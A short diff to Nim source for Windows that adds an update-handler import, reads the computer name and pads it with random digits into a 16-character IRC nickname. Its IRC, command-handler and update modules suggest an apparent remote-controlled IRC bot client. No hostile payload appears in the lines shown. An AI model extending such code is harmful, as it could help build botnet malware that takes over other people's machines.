@@ -1,6 +1,6 @@
 import irc, winim, random, strutils
 
-import command_handler
+import command_handler, update_handler
 
 var
     name_buffer: array[0..15, WCHAR]
@@ -12,7 +12,7 @@ name_size = 15*sizeof(WCHAR)
 if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
     raise newException(OSError, "Failed to retrieve computer name")
 
-# the computer name needs to become a proper string as opposed to a raw buffer
+## The computer name needs to become a proper string as opposed to a raw buffer
 for i in 0..<len(name_buffer):
     if name_buffer[i] != 0:
         name &= cast[char](name_buffer[i])
@@ -21,7 +21,7 @@ for i in 0..<len(name_buffer):
 
 #if g_dbg: echo "ComputerName: ", name
 
-# the final nickname must be 16 chars long so the rest will be filled with random digits
+## The final nickname must be 16 chars long so the rest will be filled with random digits
 randomize()
 var 
   randInt1 = rand(1000000..9999999)
